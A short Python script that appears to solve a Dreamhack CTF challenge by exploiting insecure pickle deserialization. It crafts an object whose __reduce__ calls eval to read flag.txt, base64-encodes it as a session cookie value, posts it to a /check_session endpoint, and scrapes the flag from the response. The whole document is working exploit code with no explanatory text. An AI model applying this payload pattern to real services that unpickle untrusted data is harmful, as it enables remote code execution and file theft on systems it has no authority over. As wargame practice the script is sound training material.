import pickle
import base64
import requests
import os
import pickletools
from bs4 import BeautifulSoup as bs

class Exploit(object):
    def __reduce__(self):
        p = "open('./flag.txt', 'r').read()"
        return (eval,(p,))

ClassA = Exploit()

DATA = pickle.dumps({
    'name':ClassA,
    'userid':'test',
    'password':'test'
})

PAYLOAD = base64.b64encode(DATA)

URL = "http://host3.dreamhack.games:14540"
URI = "/check_session"
POST_DATA = {'session':PAYLOAD}

resp = requests.post(URL + URI, data=POST_DATA)

soup = bs(resp.text, "html.parser")
elements = soup.select('div label')

print(elements[0].text.replace("Name: ", ""))